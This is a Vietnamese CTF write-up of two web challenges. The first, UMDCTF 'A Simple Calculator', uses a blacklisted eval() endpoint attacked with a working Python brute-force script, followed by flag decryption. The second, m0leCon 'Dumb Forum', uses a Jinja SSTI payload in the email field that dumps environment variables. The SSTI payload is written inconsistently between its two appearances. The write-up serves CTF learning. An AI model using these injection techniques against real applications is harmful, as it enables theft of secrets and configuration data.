# Some note about UMDCTF - m0leCon CTF 2022
## UMDCTF 2022 - A Simple Calculator

*source code*: https://drive.google.com/file/d/1H-VvvdStKw6ReLB2BXHYw9Zu4YLb6qIy/view?usp=sharing

Review source code

```python
# .....
from secrets import flag_enc, ws
#....
def z(f: str):
    for w in ws:
        if w in f:
            raise Exception("nope")
    return True
# .....
@app.route('/calc', methods=['POST'])
def calc():
    val = 0
    try:
        z(request.json['f'])
        val = f"{int(eval(request.json['f']))}"
# .....
```
File `secrets.py` có chứa `flag_enc` và `ws` được import vào `app.py`. `ws` có chứa các blacklist keyword đã được dấu trước khi public source-code. Server nhận f parameter đi qua hàm z, nếu trùng với blacklist thì sẽ trả về lỗi còn nếu không thì được đi vào `eval()`. 

Fuzz qua thì biết được hàm `ord()` và một số kí tự khác như `\` bị block nên không thể bypass hàm `z` hay đọc result dạng từng số ascii nên ta sẽ brute-force `flag_enc` bằng cách cắt ra từng kí tự rồi so sánh từng cái thôi. 

**Python scripts**: Brute-force encrypted flag
```python
import requests
import string

url = 'https://calculator-w78ar.ondigitalocean.app/'
characters = string.ascii_letters + string.digits + string.punctuation
# val = f"{int(eval(request.json['f']))}"

flag = ''
for i in range(len(flag), 100):
    for c in characters:
        json = {
            "f": f"flag_enc[{i}:{i+1}] == '{c}'"
        }
        
        r = requests.post(url+'calc', json=json)
        result = r.json()['result']
        print(flag+c)
        
        if result == '1':
            flag += c
            print('[FOUND] : ' + flag)
            if c == '}':
                exit('done!')
            break
```

**encrypted flag**: `OGXWNZ{q0q_vlon3z0lw3cha_4wno4ffs_q0lem!}`

Flag nhận được đã bị encrypt bằng hàm `encrypt()` trong file `secrets.py`. 

**Python scripts**: Decrypt encrypted flag
```python
FLAG = 'OGXWNZ{q0q_vlon3z0lw3cha_4wno4ffs_q0lem!}'

def encrypt(text: str, key: int):
    result = ''
    for c in text:
        if c.isupper():
            c_index = ord(c) - ord('A')
            c_shifted = (c_index + key) % 26 + ord('A')
            result += chr(c_shifted)
        elif c.islower():
            c_index = ord(c) - ord('a')
            c_shifted = (c_index + key) % 26 + ord('a')
            result += chr(c_shifted)
        elif c.isdigit():
            c_new = (int(c) + key) % 10
            result += str(c_new)
        else:
            result += c
    return result
    
def reverse(c, er):
    a = ord(c) - ord(er)
    if a >= key:
        result = a - key + ord(er)
    else:
        result = a + 26 - key + ord(er)
    return chr(result)
    
def decrypt(text: str, key: int):
    result = ''
    for c in text:
        if c.isupper():
            result += reverse(c, 'A')
        elif c.islower():
            result += reverse(c, 'a')
        elif c.isdigit():
            c_new = (int(c) + key) % 10
            result += str(c_new)
        else:
            result += c
    return result
    
def find_key():
    for i in range(100):
        if encrypt('UMDCTF', i) == 'OGXWNZ':
            return i
            
key = find_key()
print(f'[KEY FOUND] : ' + str(key))

flag_dec = decrypt(FLAG, key)
flag_enc = encrypt(flag_dec, key)

print(flag_dec)
print(flag_enc)
```
**Hoặc**:
![unknown](https://user-images.githubusercontent.com/71699412/157073116-d26b0f75-c3be-413f-96af-243932de5519.png)

**flag**: `UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0rks!}`


## m0leCon teaser 2022 - Dumb Forum
Website forum, có chức năng đăng kí rồi đăng nhập. Sau khi đăng nhập ta có thể viết và đăng lên 1 trang forums chung và có 1 tab cho xem thông tin tài khoản.
Chall này cho *sourcec-code*, review thì thấy hầu hết các `route` filter  `{` và `}` bằng hàm `validate_on_submit()`, ngoại trừ chỗ email, test thử `{{7*'7'}}` ta biết website dính SSTI chỗ register phần email.

Tuy nhiên phần email lại bị block 1 số kí tự khác như `(`, `)`, `[` và `]` nên ta không thể SSTI chọn elements hay gọi hàm/method, thử bypass cũng không thể, ngồi loay hoay tìm cách RCE không được.

Đọc lại file `config.py` mới đơ người:

```python
import os

basedir = os.path.abspath(os.path.dirname(__file__))


class Config(object):
    SECRET_KEY = os.environ.get("SECRET_KEY") or os.urandom(32)
    SQLALCHEMY_DATABASE_URI = os.environ.get(
        "DATABASE_URL"
    ) or "sqlite:///" + os.path.join(basedir, "db", "app.db")
    SQLALCHEMY_TRACK_MODIFICATIONS = False
```

Vâng `os.environ`, có mắt như \*\*, vậy để có được flag ta chỉ cần đọc được các enviroment variables mà không cần bypass các ký tự trên(bởi không thể) để RCE.

Module `os` của python có object `environ` chứa tất cả các biến môi trường, dùng class `cyler` ta tìm được đến constructor `init` và nhờ đó gọi được đến module `os` rồi form được payload sau

```python
{{cyler.init.globals.os.environ}}
```

Đặt email là: `{{joiner.init.globals.os.environ}}@a.b`, login vào profile ta được flag

..........

**FLAG**: `ptm{d1d_u_f1nd_th3_r1ckr0ll?}`
